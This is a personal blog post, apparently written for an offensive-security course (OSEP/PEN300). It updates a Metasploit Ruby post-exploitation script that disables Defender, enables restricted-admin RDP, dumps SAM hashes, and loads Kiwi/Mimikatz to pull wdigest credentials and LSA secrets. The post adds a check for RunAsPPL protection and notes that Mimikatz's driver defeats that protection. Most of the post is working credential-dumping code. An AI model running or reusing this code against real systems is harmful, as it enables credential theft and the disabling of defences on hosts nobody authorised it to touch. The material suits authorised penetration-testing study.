<!DOCTYPE html>
<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="/css/highlight.min.css">
    <link rel="stylesheet" type="text/css" href="/css/style.css">
    
    
    <title>Taha Draidia | Added RunAsPPL Check to Our PEN300 MSF Script</title>
    <script src="/js/highlight.min.js"></script>
    <script> hljs.initHighlightingOnLoad(); </script>
</head><body>
        
        <div id="container" class="container">
<span class="home_button"><a href="/">Back to home</a></span>
<h2 class="note_title">
<a href="/posts/added-runasppl-check-to-our-pen300-msf-script/" rel="bookmark"
           title="Permalink to Added RunAsPPL Check to Our PEN300 MSF Script">Added RunAsPPL Check to Our PEN300 MSF Script</a></h2>


<div class="note_info">
        <div class="origin">
            <strong>Created by:</strong><a href="https://twitter.com/tahadraidia">@tahadraidia</a> || <a href="https://tahadraidia.com">tahadraidia.com</a> 
        </div>
		<br />

        <div class="published" title="2021-12-01 10:21:33 &#43;0000 UTC">
            <strong>Published:</strong> <time datetime="2021-12-01">Dec 1, 2021</time>
        </div>
		<br />

        <div class="tags" title="tags">
        	
        	<strong>Tags:</strong>
        	
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/osep">OSEP</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/pen300">PEN300</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/ruby">Ruby</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/metasploit">Metasploit</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/mimikatz">MIMIKATZ</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/hash_dump">Hash_dump</a>
            
            
        </div>
</div>

<br>
<p>While running some test this morning and stumbled on the following error:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">Could not execute auto: Rex::Post::Meterpreter::RequestError priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
</code></pre></div><p>This occurred while executing right after enabling restricted admin in our MSF script as show in the screenshot.</p>
<p><img src="/images/RunAsPPL/error.png" alt="Error at priv_passwd_get_sam_hashes"></p>
<p>There are two important points we need to discuss here, first when the error happened, it was not handle hence, the script stop running, this bad.</p>
<p>The second point is what could go wrong right? the Meterpreter session is running as Administrator and Microsoft has been disable!</p>
<p>Well, when we wrote the script we forgot to take in consideration <code>RunAsPPL</code> protection, this post won&rsquo;t be about describing what this feature is or how to bypass this feature, plus we don&rsquo;t need to, Mimikatz does it for us, which,  we will cover later on at the end of this post.</p>
<p>Identifying the issue was trivial due to functions call used in the script, right after enabling resticted admin for RDP, the script dumps the creds found in the machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#f92672">...</span>
<span style="color:#66d9ef">if</span> is_system? <span style="color:#f92672">or</span> is_admin?
	start_admin_tasks
<span style="color:#f92672">...</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_admin_tasks</span>
	disable_defender
	enable_restricted_admin_rdp
	dump_creds
	list_tokens
<span style="color:#66d9ef">end</span>
<span style="color:#f92672">...</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_creds</span>
	priv <span style="color:#f92672">=</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Post</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Meterpreter</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Extensions</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Priv</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Priv</span><span style="color:#f92672">.</span>new(session)
	hashes <span style="color:#f92672">=</span> priv<span style="color:#f92672">.</span>sam_hashes
	print_status(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Dumping SAM Hashes&#34;</span>)
	hashes<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>hash<span style="color:#f92672">|</span>
	print_line(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">#{</span>hash<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
	<span style="color:#66d9ef">end</span>
	print_status(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Attempting to load KIWI&#34;</span>)
	b <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>core<span style="color:#f92672">.</span>use(<span style="color:#e6db74">&#39;kiwi&#39;</span>)

	<span style="color:#66d9ef">if</span> b
		print_good(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Kiwi loaded!&#34;</span>)
		kiwi <span style="color:#f92672">=</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Post</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Meterpreter</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Extensions</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Kiwi</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Kiwi</span><span style="color:#f92672">.</span>new(session)
		<span style="color:#75715e"># creds_all</span>
		credsall <span style="color:#f92672">=</span> kiwi<span style="color:#f92672">.</span>creds_all
		print_status(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Dumping creds_all&#34;</span>)
		print_status(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">#{</span>credsall<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
		<span style="color:#75715e"># creds_wdigest</span>
		credswdigest <span style="color:#f92672">=</span> kiwi<span style="color:#f92672">.</span>creds_wdigest
		print_status(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Dumping creds_wdigest&#34;</span>)
		credswdigest<span style="color:#f92672">[</span><span style="color:#e6db74">:wdigest</span><span style="color:#f92672">].</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>wdigest<span style="color:#f92672">|</span>
			print_line(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">#{</span>wdigest<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
		<span style="color:#66d9ef">end</span>
		<span style="color:#75715e"># LSA Secrets</span>
		secrets <span style="color:#f92672">=</span> kiwi<span style="color:#f92672">.</span>lsa_dump_secrets
		print_status(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Dumping LSA Secrets&#34;</span>)
		print_line(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">#{</span>secrets<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

	<span style="color:#66d9ef">end</span>
<span style="color:#66d9ef">end</span>
<span style="color:#f92672">...</span>
</code></pre></div><p>As said previously, dump_creds() function does not handle errors, this is can fixed trivially with begin block exception, which, we will do at the end. For now we will first creates function that checks if RunAsPPL is enabled on the system, to do so we can check the value of the registry <code>RunAsPPL</code> in <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_run_as_ppl_enabled?</span>
	enabled <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
	<span style="color:#66d9ef">begin</span>
		key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&#39;</span>
		root_key, base_key <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>registry<span style="color:#f92672">.</span>splitkey(key)
		value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;RunAsPPL&#39;</span>
		open_key <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>registry<span style="color:#f92672">.</span>open_key(root_key, base_key, <span style="color:#66d9ef">KEY_READ</span>)
		v <span style="color:#f92672">=</span> open_key<span style="color:#f92672">.</span>query_value(value)
		<span style="color:#66d9ef">if</span> v<span style="color:#f92672">.</span>data <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>
			enabled <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>
		<span style="color:#66d9ef">else</span>
			enabled <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
		<span style="color:#66d9ef">end</span>
		open_key<span style="color:#f92672">.</span>close
	<span style="color:#66d9ef">rescue</span> <span style="color:#f92672">=&gt;</span> exception
		print_error(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Reading RunAsPPL registery key failed: </span><span style="color:#e6db74">#{</span>exception<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
	<span style="color:#66d9ef">end</span>
	enabled
<span style="color:#66d9ef">end</span>
</code></pre></div><p>Straight forward process really, nothing out of the ordinary here, now below is the full code of the updated version of dum_creds() function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_creds</span>
	<span style="color:#66d9ef">begin</span>
		<span style="color:#66d9ef">if</span> <span style="color:#f92672">!</span>is_run_as_ppl_enabled?
			priv <span style="color:#f92672">=</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Post</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Meterpreter</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Extensions</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Priv</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Priv</span><span style="color:#f92672">.</span>new(session)
			hashes <span style="color:#f92672">=</span> priv<span style="color:#f92672">.</span>sam_hashes
			print_status(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Dumping SAM Hashes&#34;</span>)
			hashes<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>hash<span style="color:#f92672">|</span>
				print_line(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">#{</span>hash<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
			<span style="color:#66d9ef">end</span>
		<span style="color:#66d9ef">end</span>

		print_status(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Attempting to load KIWI&#34;</span>)
		b <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>core<span style="color:#f92672">.</span>use(<span style="color:#e6db74">&#39;kiwi&#39;</span>)
		<span style="color:#66d9ef">if</span> b
			print_good(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Kiwi loaded!&#34;</span>)
			kiwi <span style="color:#f92672">=</span> <span style="color:#66d9ef">Rex</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Post</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Meterpreter</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Extensions</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Kiwi</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Kiwi</span><span style="color:#f92672">.</span>new(session)
			<span style="color:#75715e"># creds_all</span>
			credsall <span style="color:#f92672">=</span> kiwi<span style="color:#f92672">.</span>creds_all
			print_status(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Dumping creds_all&#34;</span>)
			print_status(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">#{</span>credsall<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
			<span style="color:#75715e"># creds_wdigest</span>
			credswdigest <span style="color:#f92672">=</span> kiwi<span style="color:#f92672">.</span>creds_wdigest
			print_status(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Dumping creds_wdigest&#34;</span>)
			credswdigest<span style="color:#f92672">[</span><span style="color:#e6db74">:wdigest</span><span style="color:#f92672">].</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>wdigest<span style="color:#f92672">|</span>
				print_line(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">#{</span>wdigest<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
			<span style="color:#66d9ef">end</span>

			<span style="color:#75715e"># LSA Secrets</span>
			secrets <span style="color:#f92672">=</span> kiwi<span style="color:#f92672">.</span>lsa_dump_secrets
			print_status(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Dumping LSA Secrets&#34;</span>)
			print_line(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">#{</span>secrets<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
		<span style="color:#66d9ef">end</span>

	<span style="color:#66d9ef">rescue</span> <span style="color:#f92672">=&gt;</span> exception
		print_error(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">DumpCreds failed: </span><span style="color:#e6db74">#{</span>exception<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
	<span style="color:#66d9ef">end</span>
<span style="color:#66d9ef">end</span>
</code></pre></div><p>Running our tests again, no errors were raised! it is much less error prone, always check for exception and error in your code.</p>
<p><img src="/images/RunAsPPL/good.png" alt="No errors"></p>
<p>Earlier, I said that Mimikatz bypass the protection for us, I think I need to be more descriptive here for clarity. In the nutshell, the way Mimikatz bypass the feature is by loading its driver and then disable the feature from the kernel, now by simply loading Mimikatz it does it under the hound and the equivalent of hash_dump function in Mimikatz is lsa_dump_sam, which a function wrap to <code>lsadump::sam</code>.</p>
<p>References:</p>
<ul>
<li><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Kiwi/Kiwi">https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Kiwi/Kiwi</a></li>
<li><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Priv/Priv">https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Priv/Priv</a></li>
<li><a href="https://itm4n.github.io/lsass-runasppl/">https://itm4n.github.io/lsass-runasppl/</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection">https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection</a></li>
<li><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Kiwi/Kiwi#lsa_dump_sam-instance_method">https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Kiwi/Kiwi#lsa_dump_sam-instance_method</a></li>
</ul>

  <div class="contact">
    <h2>Contact</h2>
    Please feel free to ping me at <a href="https://twitter.com/tahadraidia">@tahadraidia</a>. Also you can see more of my work at <a href="https://tahadraidia.com">https://tahadraidia.com</a>.
</div>
</br> 
        </div>
        <script> hljs.initHighlightingOnLoad(); </script></body>
</html>
